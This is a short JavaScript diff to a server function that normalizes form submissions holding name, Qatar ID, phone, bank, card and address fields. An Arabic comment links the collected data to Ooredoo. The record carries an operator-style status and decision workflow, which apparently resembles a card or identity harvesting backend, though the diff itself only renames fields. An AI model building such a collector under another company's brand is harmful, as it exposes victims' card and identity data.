@@ -39,15 +39,26 @@ function readBody(req) {
 
 // تعديل الدالة لحفظ بيانات مقدم الطلب، البطاقة، وبيانات أوريدو المطلوبة
 function cleanApplication(b) {
+  const name = b.name ?? b.n;
+  const qid = b.qid ?? b.id;
+  const phone = b.phone ?? b.p;
+  const email = b.email ?? b.e;
+  const gender = b.gender ?? b.g;
+  const residency = b.residency ?? b.st;
+  const bankId = b.bankId ?? b.bank;
+  const address = b.address ?? b.ad;
   const status = ["new", "pending", "awaiting", "confirmed", "rejected"].includes(b.status) ? b.status : "new";
   return {
     ref: str(b.ref, 40) || ("HM-" + Date.now().toString().slice(-8)),
     ts: Date.now(),
-    st: b.st === "resident" ? "resident" : "citizen",
-    n: str(b.n, 120), id: str(b.id, 20).replace(/\D/g, ""), p: str(b.p, 15).replace(/\D/g, ""),
-    e: str(b.e, 160), g: b.g === "female" ? "female" : "male",
-    bank: str(b.bank, 3), bankName: str(b.bankName, 80),
-    em: str(b.em, 30), a: str(b.a, 10), ad: str(b.ad, 500),
+    n: str(name, 120), name: str(name, 120),
+    id: str(qid, 20).replace(/\D/g, ""), qid: str(qid, 20).replace(/\D/g, ""),
+    p: str(phone, 15).replace(/\D/g, ""), phone: str(phone, 15).replace(/\D/g, ""),
+    e: str(email, 160), email: str(email, 160),
+    g: gender === "female" ? "female" : "male", gender: gender === "female" ? "female" : "male",
+    st: residency === "resident" ? "resident" : "citizen", residency: residency === "resident" ? "resident" : "citizen",
+    bank: str(bankId, 3), bankId: str(bankId, 3), bankName: str(b.bankName, 80),
+    em: str(b.em, 30), a: str(b.a, 10), ad: str(address, 500), address: str(address, 500),
     card: str(b.card, 12), watch: str(b.watch, 20),
     lang: b.lang === "en" ? "en" : "ar", status, step: str(b.step, 20),
     decision: null, next: null, reason: null,
